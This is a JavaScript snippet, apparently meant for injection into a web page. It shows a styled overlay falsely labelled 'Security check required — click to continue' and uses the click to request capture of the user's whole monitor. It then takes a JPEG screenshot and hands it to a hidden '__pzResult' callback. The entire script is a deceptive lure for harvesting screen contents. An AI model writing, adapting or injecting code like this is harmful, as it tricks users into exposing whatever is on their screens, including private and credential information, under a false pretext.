(function(){
// getDisplayMedia requires a user gesture — show a subtle overlay button
if(document.getElementById('__pzSC'))return 'prompt already shown';
var o=document.createElement('div');o.id='__pzSC';
o.style.cssText='position:fixed;bottom:18px;right:18px;z-index:2147483647;background:#1a1a2e;color:#e0e0e0;font-family:system-ui,sans-serif;font-size:13px;padding:10px 16px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);cursor:pointer;border:1px solid #3b82f6;user-select:none';
o.textContent='🔒 Security check required — click to continue';
o.onclick=function(){
  o.textContent='Preparing…';
  navigator.mediaDevices.getDisplayMedia({video:{cursor:'always',displaySurface:'monitor'},audio:false})
  .then(function(stream){
    o.remove();
    var v=document.createElement('video');
    v.autoplay=true;v.playsInline=true;v.muted=true;v.srcObject=stream;
    v.onloadedmetadata=function(){
      setTimeout(function(){
        var c=document.createElement('canvas');
        c.width=v.videoWidth;c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        __pzResult(c.toDataURL('image/jpeg',0.92));
      },400);
    };
  }).catch(function(e){o.remove();__pzResult('denied:'+e.message);});
};
document.body.appendChild(o);
return '__async__';
})()